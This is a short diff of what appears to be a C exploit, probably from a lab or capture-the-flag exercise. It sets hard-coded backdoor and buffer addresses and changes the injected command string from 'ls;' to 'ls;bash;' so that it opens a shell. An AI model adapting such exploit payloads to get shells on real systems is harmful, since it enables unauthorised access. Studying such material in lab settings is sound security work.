@@ -5,7 +5,7 @@
 #define BUF_SIZE 1024
 #define uint unsigned int
 
-const char code[] = "ls;";
+const char code[] = "ls;bash;";
 uint bdoor_addr = 0x5659a63d;
 uint buf_addr = 0xffafa450;
 
